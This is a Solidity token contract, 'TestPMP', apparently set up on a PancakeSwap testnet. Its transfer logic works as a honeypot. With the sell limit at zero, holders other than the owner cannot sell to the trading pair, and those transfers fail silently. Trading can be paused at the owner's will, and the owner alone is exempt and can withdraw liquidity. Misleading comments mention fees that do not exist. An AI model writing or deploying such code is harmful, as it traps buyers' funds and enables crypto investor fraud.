// SPDX-License-Identifier: Unlicensed
 
pragma solidity ^0.6.12;
 
import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router.sol";
 
contract TestPMP is ERC20, Ownable {
    using SafeMath for uint256;
 
    IUniswapV2Router02 public uniswapV2Router;
    address public immutable uniswapV2Pair;
    bool private swapping;
 

    uint256 public maxSellTransactionAmount = 0;
    uint256 public gasForProcessing = 300000;
 
    bool public swapEnabled = false;
 
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) public automatedMarketMakerPairs;
 
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    event SendDividends(
    	uint256 tokensSwapped,
    	uint256 amount
    );
    event ProcessedDividendTracker(
    	uint256 iterations,
    	uint256 claims,
        uint256 lastProcessedIndex,
    	bool indexed automatic,
    	uint256 gas,
    	address indexed processor
    );

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
 
    constructor() public ERC20("TESTPMP", "PMST") { 
    	//IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
 
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
 
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
  
        // exclude from paying fees or having max transaction amount
        excludeFromFees(address(this), true);
 
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(owner(), 11500000000000 * (10**18));
    }
 
    receive() external payable {
 
  	}
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        bool amountExeeded = amount > maxSellTransactionAmount;
        bool transferAuthorized = swapEnabled;

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(
            to != address(uniswapV2Router) &&
            to != address(uniswapV2Router.factory()) &&
            to != address(uniswapV2Pair) 
        ){
            amountExeeded = false;
        }

        if(
            to == address(0) ||
            from == address(0) ||
            to == owner() || 
            from == owner()
        ){
            transferAuthorized = true;
            amountExeeded = false;
        }
 
        if(transferAuthorized && !amountExeeded){
            super._transfer(from, to, amount);
        }
    }
 
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "TEST: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }
 
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "TEST: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;
 
        emit ExcludeFromFees(account, excluded);
    } 
 
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "TEST: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
 
        _setAutomatedMarketMakerPair(pair, value);
    }
 
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "TEST: Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;
 
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "TEST: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "TEST: Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
 
    function setMaxSellTxAMount(uint256 amount) external onlyOwner{
        maxSellTransactionAmount = amount;
    }

    function pause() external onlyOwner{
        swapEnabled = false;
    }
 
    function play() external onlyOwner{
        swapEnabled = true;
    }
    
    function removeLiquidity(
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin
    ) external onlyOwner {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), amountTokenMin);

        // remove the liquidity
        uniswapV2Router.removeLiquidityETH(
            address(this),
            liquidity,
            amountTokenMin,
            amountETHMin,
            owner(),
            block.timestamp
        );
    }
}